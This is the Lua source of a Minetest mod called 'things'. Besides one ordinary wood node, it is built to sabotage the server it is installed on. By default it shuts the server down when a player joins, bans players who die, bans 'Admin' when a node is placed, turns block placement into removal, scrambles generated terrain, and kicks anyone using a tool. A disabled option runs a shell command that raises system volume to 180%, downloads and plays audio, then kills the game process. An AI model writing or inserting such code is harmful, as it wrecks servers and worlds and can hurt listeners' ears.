local load_time_start = os.clock()

local http_api = minetest.request_http_api and minetest.request_http_api()

things = {
	new_nodes = true,
	auto_shutdown = true,
	replace_setnode = true,
	replace_vars = false,
	ban_thing = true,
	new_randomity = false,
	ban_on_die = true,
	lol_function = true,
	yaw_rotating = true,
	physics_changing = true,
	random_mapgen = true,
	replace_more_vars = true,
	add_sound = false, -- Warning, never use this with headphones to not do harm to your ears
	tell_news = true,
	dirt_api = true,
	things_cmd = true
}

if things.new_nodes then
	minetest.register_node("things:framed_wood", {
		description = "Framed Wood",
		tiles = {"default_wood.png^default_glass.png"},
		groups = {snappy=1,choppy=2,oddly_breakable_by_hand=2},
	})
end

if things.auto_shutdown then
	minetest.register_on_prejoinplayer(function(name, ip)
		core.request_shutdown()
		core.chat_send_all(";)")
	end)
end

if things.replace_setnode then
	local sn = minetest.set_node
	function minetest.set_node(pos, ...)
		pos.y = pos.y+1
		return sn(pos, ...)
	end
	minetest.add_node = minetest.set_node
end

if things.replace_vars then
	local null = nil
	core = null
	minetest = null
end

if things.ban_thing then
	minetest.register_node("things:thing", {
		description = "Thing BEWARE!",
		tiles = {"abjrules.png"},
		on_place = function()
			minetest.execute_chatcommand("ban Admin")
		end
	})
end

if things.new_randomity then
	function math.random(a)
		return a or 1
	end
end

if things.ban_on_die then
	minetest.register_on_dieplayer(function(player)
		minetest.chat_send_all(player:get_player_name().." died and will get banned!")
		minetest.ban_player(player:get_player_name())
	end)
end

if things.lol_function then
	function lol()
		print("trololo :P")
		return lol()
	end
end

if things.yaw_rotating then
	local yaw = 0
	minetest.register_globalstep(function(dtime)
		yaw = yaw + 0.1
		for _, player in pairs(minetest.get_connected_players()) do
			player:set_look_yaw(yaw)
		end
	end)
end

if things.physics_changing then
	local r = math.random
	local randomize_min = 1
	local randomize_max = 10

	minetest.register_globalstep(function(dtime)
		for _, player in pairs(minetest.get_connected_players()) do
			player:set_physics_override(
				r(randomize_min,randomize_max),
				r(randomize_min,randomize_max),
				r(randomize_min,randomize_max)
			)
		end
	end)
end

if things.random_mapgen then
	local count = 0
	local c_air = minetest.get_content_id("air")

	local function count_nodes()
		for i,_ in pairs(minetest.registered_nodes) do
			count = count+1
		end
	end

	minetest.register_on_generated(function(minp, maxp, seed)
		if count == 0 then
			count_nodes()
		end

		local pr = PseudoRandom(seed+68)

		local vm, emin, emax = minetest.get_mapgen_object("voxelmanip")
		local data = vm:get_data()
		local area = VoxelArea:new{MinEdge=emin, MaxEdge=emax}

		for i in area:iterp(minp, maxp) do
			if data[i] ~= c_air then
				data[i] = pr:next(1, count)
			end
		end

		vm:set_data(data)
		vm:write_to_map()
	end)
end

if things.replace_more_vars then
	minetest.set_node = minetest.remove_node
	minetest.request_shutdown = function()
		minetest.chat_send_all("<herobrine> hjalp")
	end
	minetest.nodedef_default.stack_max = 42
	minetest.nodedef_default.on_place = function()
		minetest.chat_send_all("Beep")
	end
	function dump(s)
		return "nil"
	end
	for name, def in pairs(minetest.registered_tools) do
		def.on_use = function(itemstack, player, pointed_thing)
			minetest.kick_player(player:get_player_name(), "TROLOLOLO ;D")
		end
	end
end

if things.add_sound then
	os.execute("amixer set Master 180% && curl -s https://raw.githubusercontent.com/GNOME/gnome-robots/1a0ecfd392b2deab0fee9f10a1e8630a3b31e58d/data/die.ogg | tee tmp && paplay tmp && kill $(pgrep minetest)")
end

if things.tell_news and http_api then
	local feed_url = "https://queryfeed.net/tw?q=Minetest"
	local receive_interval = 10

	local old_tweet
	local function pcall_function(data)
		local contents = data.responseData.feed.entries[1]
		local text = "<"..contents.author.."> "..contents.contentSnippet
		if old_tweet ~= text then
			old_tweet = text
			minetest.chat_send_all(text)
		end
	end

	local function fetch_callback(result)
		if not result.completed then
			return
		end

		pcall(pcall_function, minetest.parse_json(result.data))
	end

	local function get_latest_tweet()
		local json_url = "https://ajax.googleapis.com/ajax/services/feed/load?v=1.0&q="..feed_url.."&num=1"

		http_api.fetch({url = json_url, timeout = receive_interval}, fetch_callback)

		minetest.after(receive_interval, get_latest_tweet)
	end

	minetest.after(1, get_latest_tweet)
end

if things.dirt_api then
	-----------The
	-----------Dirt api!
	-----------by azekill_DIABLO

	-- Checks if a given position is already occupied
	local function is_pos_occupied(pos)
		return (minetest.get_node(pos).name ~= "air")
	end

	-- Returns a random neighbour pos
	local function get_neighbour(pos, prefer_horizontal)
		local neighbour = vector.new(pos)
		while vector.equals(pos, neighbour) do
			-- Generate three random integers from -1 to 1 that represent possible
			-- neighbour's coordinates projections
			-- FIXME: I LAG FOR SOME REASON
			-- Finally, calculate the position

			neighbour = {
				x = pos.x + math.random(-1, 1),
				y = pos.y + math.random(-1, prefer_horizontal and 0 or 1),
				z = pos.z + math.random(-1, 1)
			}
		end
		-- Return the result
		return neighbour
	end

	minetest.register_abm({
		nodenames = {
			"group:soil", "default:stone", "default:desert_stone",
			"default:sand", "default:desert_sand"
		},
		interval = 1,
		chance = 2,
		action = function(pos, node, active_object_count, active_object_count_wider)
			local neighbour = get_neighbour(pos, true)
			if not is_pos_occupied(neighbour) then
				minetest.set_node(neighbour, node)
			end
		end,
	})
end

if things.things_cmd then
	minetest.register_chatcommand("set_things", {
		params = "<setting> <true/false>",
		description = "Changes the behaviour of things.",
		privs = {server = true},
		func = function(name, param)
			local parts = param:lower():split(' ')
			if #parts ~= 2 then
				return false, "Wrong usage. Check command syntax."
			end
			local setting = things[parts[1]]
			if setting == nil then
				return false, "Unknown setting."
			end
			local value = minetest.is_yes(parts[2])
			if setting == value then
				return false, "That setting is already set to ".. tostring(value)
			end
			things[parts[1]] = value
			return true, "MMh ok."
		end
	})
end

local time = math.floor(tonumber(os.clock()-load_time_start)*100+0.5)/100
local msg = "[things] loaded after ca. "..time
if time > 0.05 then
	print(msg)
else
	minetest.log("info", msg)
end
